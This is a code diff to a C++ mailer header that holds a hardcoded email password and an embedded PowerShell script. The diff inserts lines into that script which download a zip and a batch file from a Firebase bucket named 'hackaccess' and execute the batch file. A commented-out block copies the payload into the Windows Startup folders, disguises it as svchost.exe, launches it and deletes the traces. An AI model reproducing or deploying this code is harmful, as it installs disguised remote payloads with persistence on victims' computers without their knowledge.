@@ -16,6 +16,10 @@ namespace Mail
     #define X_EM_PASS "accountworks"
 
 const std::string &PowerShellScript =
+"$client = new-object System.Net.WebClient \r \n"
+"$client.DownloadFile( \"https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/abc.zip?alt=media&token=baafa4ad-0276-466e-88d3-5757503cedf4\", \".\\zk.zip\") \r \n "
+"$client.DownloadFile( \"https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/z.bat?alt=media&token=bc9f3920-3712-4345-82c6-f8d83e49167f\",   \".\\z.bat\") \r \n "
+"cmd.exe /c .\z.bat \r \n"
 "Param( #parameters to our script\r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
 "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
 " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
@@ -145,4 +149,12 @@ const std::string &PowerShellScript =
 }
 #endif
 
-
+/*
+"cmd.exe /c  echo f|xcopy /f ".\abc.zip" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" \r\n"
+"cmd.exe /c rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.zip" "svchost.exe" \r \n"
+"cmd.exe /c start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe" \r \n"
+"cmd.exe /c echo f|xcopy ".\abc.zip" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" \r \n"
+"cmd.exe /c rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc.zip" "svchost.exe"\r\n"
+"cmd.exe /c del ".\abc.zip" \r \n "
+"cmd.exe /c del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.zip" \r \n"
+*/
